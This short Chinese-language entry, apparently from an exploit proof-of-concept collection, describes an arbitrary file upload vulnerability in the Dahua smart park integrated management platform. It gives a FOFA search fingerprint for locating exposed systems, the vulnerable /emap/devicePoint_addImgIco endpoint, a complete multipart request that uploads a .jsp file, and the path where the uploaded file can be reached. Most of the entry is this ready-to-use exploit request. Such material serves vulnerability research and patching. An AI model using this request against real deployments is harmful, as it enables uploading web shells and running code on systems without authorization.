# 大华智慧园区综合管理平台devicePoint_addImgIco任意文件上传漏洞

- **系统**：大华　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`FOFA：`app=”dahua-智慧园区综合管理平台”``
- **请求**：`POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1`

**请求体 / payload**
```
构造如下数据包：
Content-Type: multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
Host: 127.0.0.1:8009
Content-Length: 223
--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
Content-Disposition: form-data; name="upload"; filename="1ndex.jsp"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary
123
--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--

上传文件访问地址：`http://127.0.0.1:8314/upload/emap/society_new/ico_res_221b04b177b8_on.jsp`\
```

**其他**
- 大华智慧园区综合管理平台devicePoint\_addImgIco任意文件上传漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 大华智慧园区综合管理平台